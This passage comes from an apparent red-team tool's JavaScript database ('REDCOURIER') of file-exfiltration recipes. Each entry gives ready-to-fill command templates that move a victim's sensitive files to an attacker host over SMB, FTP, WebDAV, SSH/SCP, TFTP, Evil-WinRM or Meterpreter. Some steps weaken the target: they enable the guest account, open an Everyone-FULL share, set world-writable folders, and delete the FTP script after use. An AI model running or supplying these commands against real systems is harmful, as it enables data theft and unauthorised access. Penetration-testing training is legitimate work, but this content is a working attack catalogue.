            { role: "target", title: "Exfiltrate File via UNC Copy", desc: "Execute the native copy command on the Windows target to push the sensitive file back to the Kali share.", type: "code", template: "copy C:\\Windows\\Tasks\\<FILE> \\\\<SRC_IP>\\share\\<FILE>" }
        ]
    },
    {
        tech: "SMB", id: "smb_windows_native_share_linux_host_exfil", name: "SMB - Native Windows Admin Share (Linux Attacker)", os: "windows", direction: "exfil",
        steps: [
            { role: "target", title: "Create File Share on Target (Requires Admin)", desc: "Open an administrative file share directly on the victim machine to allow data extraction.", type: "code", template: "mkdir c:\\\\temp\\\\transfer\nnet user guest /active:yes\nnet share transfer=c:\\\\temp\\\\transfer /GRANT:Everyone,FULL" },
            { role: "attacker", title: "Extract Data from Target Share via Linux/Kali", desc: "Connect back from your Linux machine using smbclient to pull the sensitive file from the victim.", type: "code", template: "smbclient //<TGT_IP>/transfer -N -c 'get <FILE> ~/Desktop/<FILE>'" }
        ]
    },
    {
        tech: "SMB", id: "smb_windows_native_share_win_host_exfil", name: "SMB - Native Windows Admin Share (Windows Attacker/Pivot)", os: "windows", direction: "exfil",
        steps: [
            { role: "target", title: "Create File Share on Target (Requires Admin)", desc: "Open an administrative file share directly on the victim machine to allow data extraction.", type: "code", template: "mkdir c:\\\\temp\\\\transfer\nnet user guest /active:yes\nnet share transfer=c:\\\\temp\\\\transfer /GRANT:Everyone,FULL" },
            { role: "attacker", title: "Extract Data from Target Share via Windows Host", desc: "Copy the file directly from the victim share over the UNC path back to your Windows pivot box.", type: "code", template: "copy \\\\<TGT_IP>\\transfer\\<FILE> C:\\Windows\\Temp\\<FILE>" }
        ]
    },
    // --- FTP EXFILTRATION ---
    {
        tech: "FTP", id: "ftp_non_interactive_exfil_win", name: "FTP - Non-Interactive Script Exfiltration ➔ Windows Target", os: "windows", direction: "exfil",
        steps: [
            { role: "attacker", title: "Start FTP Server", desc: "Ensure your selected FTP backend is running and has write access allowed.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Create Exfiltration Script", desc: "Build the automated macro script file targeting data extraction rules.", type: "code", template: "echo open <SRC_IP> <PORT> > ftp_exfil.txt\necho offsec >> ftp_exfil.txt\necho password >> ftp_exfil.txt\necho bin >> ftp_exfil.txt\necho put <FILE> >> ftp_exfil.txt\necho bye >> ftp_exfil.txt" },
            { role: "target", title: "Execute Automated Exfiltration", desc: "Push the sensitive operational target data back to your listener environment via the macro automation wrapper.", type: "code", template: "ftp -i -s:ftp_exfil.txt\ndel ftp_exfil.txt" }
        ]
    },
    {
        tech: "FTP", id: "ftp_linux_pure_bash_exfil", name: "FTP - Non-Interactive Heredoc Transfer ➔ Linux Target", os: "linux", direction: "exfil",
        steps: [
            { role: "attacker", title: "Host payload via FTP", desc: "Run your selected FTP platform service.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Execute Bash Heredoc Upload (Exfil)", desc: "Exfiltrate local target assets back to your controller using the identical interactive text-stream feeding method.", type: "code", template: "ftp -nv <SRC_IP> <PORT> <<EOF\nuser offsec password\nbinary\nput /tmp/<FILE> <FILE>\nquit\nEOF" }
        ]
    },
    // --- INTERACTIVE DESKTOP & C2 EXFILTRATION ---
    {
        tech: "RDP", id: "rdp_gui_exfil", name: "RDP Native Clipboard Copy / Drive Redirection", os: "any", direction: "exfil",
        steps: [
            { role: "info", title: "RDP Clipboard Exfiltration", desc: "To exfiltrate, simply right-click the file inside the RDP desktop session, copy it, and paste it back onto your local attacker filesystem workspace.", type: "info" }
        ]
    },
    {
        tech: "EVIL-WINRM", id: "winrm_upload_exfil", name: "Evil-WinRM Active Session Transfer", os: "windows", direction: "exfil",
        steps: [
            { role: "target", title: "Download data via active session", desc: "Exfiltrate a sensitive file back onto your attacker platform shell environment.", type: "code", template: "download <FILE> ~/secret.txt" }
        ]
    },
    {
        tech: "METASPLOIT", id: "msf_upload_win_exfil", name: "Meterpreter Session Transfer ➔ Windows Target", os: "windows", direction: "exfil",
        steps: [
            { role: "target", title: "Download via active Meterpreter Shell", desc: "Exfiltrate the target file directly from the Windows target back to your attacker machine.", type: "code", template: "download C:\\Windows\\Tasks\\<FILE> /tmp/<FILE>" }
        ]
    },    
    {
        tech: "WEBDAV", id: "webdav_type_exfil", name: "WebDAV - Type Stream Execution (LOLBAS)", os: "windows", direction: "exfil",
        steps: [
            { role: "attacker", title: "Start WebDAV Server on Kali (Write Access)", desc: "Ensure your WebDAV listener environment has proper write and upload permissions active.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Exfiltration via Type Stream (MITRE T1048.003)", desc: "Stream the text or binary asset directly onto the remote attacker WebDAV server root path.", type: "code", template: "type C:\\Windows\\Tasks\\<FILE> > \\\\<SRC_IP>@<PORT>\\DavWWWRoot\\<FILE>" }
        ]
    },
    {
        tech: "SSH", id: "ssh_windows_exfil_push_client_mode", name: "SSH - Native Client Push Stream (Attacker is Host)", os: "any", direction: "exfil",
        steps: [
            { role: "attacker", title: "Activate SSH Server on Attacker Host", desc: "Ensure your attacker environment is running its native SSH daemon to accept the incoming encrypted data stream.", type: "code", template: "<HOST_CMD>" },
            { role: "target", title: "Push Loot via Native SSH Client", desc: "Execute this on the victim machine to stream the local sensitive file straight into the attacker's running SSH server context.", type: "code", template: "ssh <SSH_USER>@<SRC_IP> \"cat > /tmp/exfil_<FILE>\" < <FILE>" }
        ]
    },
    {
        tech: "SCP", id: "scp_windows_exfil_pull_server_mode", name: "SCP - Native Attacker Pull Transfer (Victim is Host)", os: "any", direction: "exfil",
        steps: [
            { role: "target", title: "Ensure OpenSSH Server is Active on Target", desc: "The target must be running the sshd service so the attacker can authenticate and grab files.", type: "code", template: "PowerShell -c \"Start-Service sshd; Get-Service sshd\" 2>/dev/null || sudo systemctl start ssh" },
            { role: "attacker", title: "Pull Loot via SCP from Attacker Machine", desc: "Execute this command on your attacker machine to connect to the victim and securely download the loot to your local directory.", type: "code", template: "scp Administrator@<TGT_IP>:C:/Users/Public/<FILE> ./exfil_<FILE> 2>/dev/null || scp root@<TGT_IP>:/tmp/<FILE> ./exfil_<FILE>" }
        ]
    },
    {
        tech: "SSH", id: "ssh_windows_exfil_pull_stream", name: "SSH - Native Attacker Pull Data Stream (Victim is Host)", os: "any", direction: "exfil",
        steps: [
            { role: "target", title: "Ensure OpenSSH Server is Active on Target", desc: "The target must be running the sshd service to allow outbound streaming.", type: "code", template: "PowerShell -c \"Start-Service sshd; Get-Service sshd\" 2>/dev/null || sudo systemctl start ssh" },
            { role: "attacker", title: "Stream Loot from Target to Attacker", desc: "Execute this on your attacker terminal to execute a remote read command over SSH and write the output stream directly into a local file.", type: "code", template: "ssh Administrator@<TGT_IP> \"cmd /c type C:\\path\\to\\<FILE>\" > ./exfil_<FILE> 2>/dev/null || ssh root@<TGT_IP> \"cat /tmp/<FILE>\" > ./exfil_<FILE>" }
        ]
    },
    {
        tech: "SCP", id: "scp_linux_exfil_native", name: "SCP - Secure Copy Data Exfiltration (Linux Target)", os: "linux", direction: "exfil",
        steps: [
            { role: "attacker", title: "Start SSH Server on Kali", desc: "Ensure the local Kali open SSH service container is ready to intercept incoming parameters.", type: "code", template: "sudo systemctl start ssh" },
            { role: "target", title: "Push Loot from Linux Target to Kali", desc: "Execute secure copy commands directly on the victim shell terminal to upload data encrypted.", type: "code", template: "scp /tmp/<FILE> <SSH_USER>@<SRC_IP>:/tmp/exfil_<FILE>" }
        ]
    },
    // =========================================================================
    // --- TFTP EXFILTRATION METHODS (UPLOADS) ---
    // =========================================================================
    {
        tech: "TFTP", id: "tftp_win_exfil", name: "TFTP - Native Exfiltration One-Liner ➔ Windows Target", os: "windows", direction: "exfil",
        steps: [
            { role: "attacker", title: "Prepare Write Permissions", desc: "Ensure your ATFTP server folder has universal write permissions available to catch the loot.", type: "code", template: "sudo chmod 777 /tftp && <HOST_CMD>" },
            { role: "target", title: "Execute TFTP Upload", desc: "Push local sensitive data blocks straight over UDP port 69 back to your attacker instance.", type: "code", template: "tftp -i <SRC_IP> PUT <FILE>" }
        ]
    },
    {
        tech: "TFTP", id: "tftp_linux_exfil", name: "TFTP - Interactive Non-Blocking Exfil ➔ Linux Target", os: "linux", direction: "exfil",
        steps: [
            { role: "attacker", title: "Prepare Write Permissions", desc: "Ensure your ATFTP server folder has universal write permissions available to catch the loot.", type: "code", template: "sudo chmod 777 /tftp && <HOST_CMD>" },
            { role: "target", title: "Execute Bash Heredoc Upload", desc: "Exfiltrate local target assets back to your controller using the non-blocking text-stream feeding method.", type: "code", template: "tftp <SRC_IP> <PORT> <<EOF\nbinary\nput <FILE>\nquit\nEOF" }
        ]
    }
]; // End of transferDatabase array 

console.log("[REDCOURIER] Central database v12 successfully initialized.");
